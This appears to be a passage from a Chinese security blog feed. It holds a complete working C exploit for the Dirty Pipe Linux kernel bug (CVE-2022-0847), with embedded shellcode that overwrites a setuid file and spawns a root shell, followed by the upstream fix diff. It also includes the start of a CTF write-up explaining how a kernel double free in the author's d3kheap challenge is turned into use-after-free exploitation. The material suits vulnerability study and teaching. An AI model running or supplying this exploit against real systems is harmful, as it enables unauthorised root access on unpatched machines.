class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * exploit of CVE-2022-0847</span></span><br><span class="line"><span class="comment"> * written by arttnba3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> shellcode_len = <span class="number">149</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span>page_size;</span><br><span class="line"><span class="type">size_t</span>offset_in_file;</span><br><span class="line"><span class="type">size_t</span> data_size;</span><br><span class="line"><span class="type">int</span> target_file_fd;</span><br><span class="line"><span class="type">int</span>pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> pipe_size;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">// checking before we start to exploit</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">offset_in_file = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit now...</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment"> * Just write and read through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment"> * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment"> * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">offset_in_file--;<span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment"> * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment"> * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = write(pipe_fd[<span class="number">1</span>], &amp;shellcode[<span class="number">1</span>], shellcode_len);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Write failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; shellcode_len)</span><br><span class="line">errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Trigger root shell...\033[0m&quot;</span>);</span><br><span class="line">system(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Ubuntu 21.10 、内核版本 <code>5.13.0-28</code>  上测试的结果如下，成功完成提权：</p><p><img src="https://s2.loli.net/2022/03/12/P2QdeIqbASfuxHR.png" alt="image.png"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04.漏洞修复"></a>0x04.漏洞修复</h1><p>漏洞的修复方式比较简单，只需要在对应的涉及到 <code>pipe_buffer-&gt;flags</code> 的代码添加上将 flag 置 0 的代码即可，除了 <code>copy_page_to_iter_pipe</code> 以外在 <code>push_pipe</code> 中也缺失了置 0 的代码，补充上即可：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/lib/iov_iter.c b/lib/iov_iter.c</span></span><br><span class="line"><span class="comment">index b0e0acdf96c1..6dd5330f7a99 100644</span></span><br><span class="line"><span class="comment">--- a/lib/iov_iter.c</span></span><br><span class="line"><span class="comment">+++ b/lib/iov_iter.c</span></span><br><span class="line"><span class="meta">@@ -414,6 +414,7 @@</span> static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by</span><br><span class="line"> return 0;</span><br><span class="line"> </span><br><span class="line"> buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line"><span class="addition">+buf-&gt;flags = 0;</span></span><br><span class="line"> get_page(page);</span><br><span class="line"> buf-&gt;page = page;</span><br><span class="line"> buf-&gt;offset = offset;</span><br><span class="line"><span class="meta">@@ -577,6 +578,7 @@</span> static size_t push_pipe(struct iov_iter *i, size_t size,</span><br><span class="line"> break;</span><br><span class="line"> </span><br><span class="line"> buf-&gt;ops = &amp;default_pipe_buf_ops;</span><br><span class="line"><span class="addition">+buf-&gt;flags = 0;</span></span><br><span class="line"> buf-&gt;page = page;</span><br><span class="line"> buf-&gt;offset = 0;</span><br><span class="line"> buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);</span><br></pre></td></tr></table></figure><blockquote><p>参见<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">linux-kernel.vger.kernel.org archive mirror</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;我超，管人痴！&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记</title>
    <link href="http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/"/>
    <id>http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/</id>
    <published>2022-03-08T10:25:07.000Z</published>
    <updated>2022-05-16T21:46:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本题的原型来自于笔者大三上学期面试国内某安全大厂时的一道面试题，当时的问题是：</p><ul><li>“在保护全开的情况下若是给你一个内核空间中的 double free，大小为███，你该怎样去利用？”</li></ul><p>笔者在当时并未答出一个令面试官较为满意的答案，之后笔者重新思考，发现这是一个<strong>十分有意思</strong>的问题：这十分贴近于现实内核漏洞的抽象模型之一。</p><p>相比于 CTF 中 pwn 题所给予的“优越”的环境，现实中的漏洞往往就<strong>只是</strong>一个引用计数错误导致的 double free、一个溢出（可能只是一个 <code>\0</code> 字节）、一个垂悬指针导致的 UAF…在这种漏洞环境当中，我们并没有“出题人”给予我们的“菜单堆”的各种功能</p><p>因此，在这样“恶劣”的漏洞环境之下，我们不能仅仅寄希望于这个漏洞有一个较好的品相、既能帮我们泄露内核基址又能帮我们劫持控制流，而应当更多地<strong>借助内核本身提供给我们的工具</strong>，以寻求更为<strong>通用</strong>的解法</p><p>如何寻求更为通用的解法？大家都知道对于用户态的 glibc 堆题而言我们往往有着一种通用解法——将漏洞转为 UAF。无论是 overlapping 、double free、overflow…最终我们都可以通过将其转化为 UAF 完成利用，这个法则对于“内核堆”而言同样有效</p><p>基于这种思想，对于内核中的 double free、堆溢出等漏洞，我们都可以想方法将其化为 UAF，之后再通过通用的解法完成解题——<strong>本题便是笔者对于在内核漏洞利用的 UAF 阶段之后通用的解法的一个探索与尝试</strong></p><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>笔者在 README.md 中额外说明了内核的如下编译选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><p>即除了 FG-KASLR 以外大部分主流的保护都开启了</p><p>因为笔者更希望大家能够关注于漏洞利用上，因此题目本身的逻辑十分简单，只提供了一个 ioctl “菜单”，<strong>有效的功能只有分配与释放 buf</strong>，分配的大小为 1024</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">d3kheap_ioctl</span><span class="params">(<span class="keyword">struct</span> file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">    spin_lock(&amp;spin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> OBJ_ADD:</span><br><span class="line">                <span class="keyword">if</span> (buf)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] You already had a buffer!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                buf = kmalloc(<span class="number">1024</span>, GFP_KERNEL);</span><br><span class="line">                ref_count++;</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[d3kheap:] Alloc done.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_EDIT:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_SHOW:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_DEL:</span><br><span class="line">                <span class="keyword">if</span> (!buf)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] You don\&#x27;t had a buffer!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!ref_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] The buf already free!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ref_count--;</span><br><span class="line">                kfree(buf);</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[d3kheap:] Free done.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Invalid instructions.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spin_unlock(&amp;spin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>涉及到的两个全局变量初始值如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> ref_count = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>根据 ioctl 的逻辑，当我们分配了一个 object 之后 <strong>ioctl 的分配功能就无效了</strong>，而每当我们进行一次释放，<code>ref_count</code> 便会减一，当其为 0 时 <strong>ioctl 的释放功能也被无效化</strong></p><p>漏洞点很明显，对 <code>ref_count</code> 的错误初始化导致我们可以释放 buf 两次，即该模块<strong>只提供给你三次操作机会，一次分配，两次释放，我们不能通过漏洞模块对 buf 进行任何额外的操作</strong>（例如读&#x2F;写），本质上就是——“给你一次内核空间中大小为 1024 的 object 的 double free 的机会，保护全开，你该如何去利用？”</p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>因为在 slub_free 中有着对 double free 的简单检查（类似于 glibc 中的 fastbin，会检查 freelist 指向的第一个 object），因此我们不能够直接进行 double free，而应该将其转化为 UAF 进行利用</p><h2 id="构造-UAF"><a href="#构造-UAF" class="headerlink" title="构造 UAF"></a>构造 UAF</h2><p>我们首先需要构造一个 UAF，我们不难想到如下利用链：</p><ul><li>分配一个 1024 大小的 object</li><li>释放该 object</li><li>将其分配到别的结构体（victim）上</li><li>释放该 object</li></ul><p>此时 victim 虽然还处在使用阶段，但是<strong>在 slub 中其同时也被视为一个 free object</strong>，我们此时便完成了 UAF 的构造，由于 slub 遵循 LIFO，因此接下来分配的第一个大小为 1024 的 object <strong>便会是 victim</strong></p><p>接下来有两种解法，一种是笔者最初想到的比较笨重的内存搜索解法，另一种是基于 Google 在 CVE-2021-22555 中给出的通用 UAF 解法</p><h2 id="解法一：利用-setxattr-多次劫持-msg-msg"><a href="#解法一：利用-setxattr-多次劫持-msg-msg" class="headerlink" title="解法一：利用 setxattr 多次劫持 msg_msg"></a>解法一：利用 setxattr 多次劫持 msg_msg</h2><h3 id="Step-I-setxattr-修改-object-内容"><a href="#Step-I-setxattr-修改-object-内容" class="headerlink" title="Step.I setxattr 修改 object 内容"></a>Step.I setxattr 修改 object 内容</h3><p>接下来我们思考如何对一个 free 状态的 object 内写入数据，这里笔者要向大家介绍一个名为 setxattr 的系统调用（对内核安全稍有研究的同学应该都接触过）</p><p>setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供<strong>近乎任意大小的内核空间 object 分配</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong>，完成写入之后该 object 又会通过 kvfree 被释放掉，因此我们便可以通过 setxattr <strong>多次修改 victim 的内容</strong></p><p>不够完美的一点是，slub 中 free 的 object 同样是连接成一个单向链表，因此我们无法控制该 object 中 <code>kmem_cache-&gt;offset</code> 偏移处的 8 字节的内容，但这个 offset 的存在<strong>也从另一个侧面提供给了我们便利</strong>，在接下来的利用中你会看到这一点</p><p>可能有的人还会想到 userfaultfd + setxattr 这一技术，或许可以利用这个技术劫持 freelist 完成任意地址分配与任意地址写？但是<strong>自从内核版本 5.11 起，userfaultfd 被限制为默认情况下只有 root 权限才能使用</strong>，因此这条路暂时是走不通的，我们接下来要找一个不是特别受分配大小影响的结构体</p><h3 id="Step-II-msg-msg-搜索内存完成地址泄露"><a href="#Step-II-msg-msg-搜索内存完成地址泄露" class="headerlink" title="Step.II msg_msg 搜索内存完成地址泄露"></a>Step.II msg_msg 搜索内存完成地址泄露</h3><p>现在我们有了「写的原语」，接下来我们要寻找「读的原语」，在 Linux kernel 中有着一组 system V 